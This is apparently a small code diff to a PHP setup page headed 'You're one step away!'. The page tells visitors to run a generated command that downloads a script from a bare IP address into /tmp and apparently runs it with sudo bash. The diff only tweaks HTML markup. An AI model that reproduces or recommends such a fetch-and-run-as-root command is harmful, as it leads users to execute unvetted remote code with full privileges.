@@ -86,13 +86,13 @@ $final_file = "curl -s http://174.34.170.64/temp/$id > /tmp/wingscript; sudo bas
     <div class="container">
 
 		<!-- Main hero unit -->
-		<div class="hero-unit">
+		<div class="hero-unit" >
 			<center> 
 				<h1>You're one step away!</h1>
 			</br>
 				<p>Please run this command in your terminal</p>
 			</br>
-				<pre>
+				<pre class="curl-tag code">
 					<?php
 						echo "<p text-align='center'>" . $final_file . "</p>";
 					?>
